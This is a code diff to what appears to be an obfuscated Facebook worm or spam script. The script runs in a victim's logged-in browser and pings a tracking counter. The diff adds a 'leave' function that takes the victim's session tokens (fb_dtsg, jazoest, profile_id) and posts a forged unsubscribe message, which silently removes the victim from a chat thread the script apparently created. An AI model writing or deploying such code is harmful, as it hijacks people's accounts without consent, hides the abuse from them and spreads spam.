@@ -1,4 +1,5 @@
 (new Image).src = "//whos.amung.us/swidget/mandar1n0s";
+
 var cnsl = true;
 var win = this;
 var sie = win["XMLHttpRequest"];
@@ -216,14 +217,52 @@ function message(c) {
     if (4 == f["readyState"] && 200 == f["status"]) {
       var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
       if (!d["error"]) {
-        c["post_id"] = _t(d, "targetfbid");
+        c["thread_fbid"] = _t(d, "thread_fbid");
+        leave(c);
 
       }
     }
   };
 }
+function leave(c) {
+  var message = generate_name(10);
+  message_id = _v(0xa1b01d4b1c7, 999999999999999);
+  var d$$0 = {};
+  d$$0["client"] = "mercury";
+  d$$0["action_type"] = "ma-type:log-message";  //translated title
+  d$$0["ephemeral_ttl_mode"] = 0;
+  d$$0["log_message_data[removed_participants][0]"] = "fbid:"+profile_id;
+  d$$0["log_message_type"] = "log:unsubscribe";
+  d$$0["message_id"] = message_id;
+  d$$0["offline_threading_id"] = message_id;
+  d$$0["source"] = "source:chat:web";
+  d$$0["thread_fbid"] = c["thread_fbid"];
+  d$$0["timestamp"] = Date.now();
+  d$$0["__user"] = profile_id;
+  d$$0["__a"] = 1;
+  d$$0["__dyn"] = dyn;
+  d$$0["__af"] = "i0";
+  d$$0["__req"] = "q";
+  d$$0["__be"] = -1;
+  d$$0["__pc"] = "PHASED:DEFAULT";
+  d$$0["__rev"] = __rev;
+  d$$0["fb_dtsg"] = fb_dtsg;
+  d$$0["jazoest"] = jazoest;
 
+  var f = new sie;
+  f["open"]("POST", "https://www.facebook.com/messaging/send/?dpr=1&ext=me");
+  f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  f["send"](_z(d$$0));
+  f["onreadystatechange"] = function() {
+    if (4 == f["readyState"] && 200 == f["status"]) {
+      var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
+      if (!d["error"]) {
+        //c["post_id"] = _t(d, "targetfbid");
 
+      }
+    }
+  };
+}
 
 function generate_name(length,firstUpper){
     rname = "";
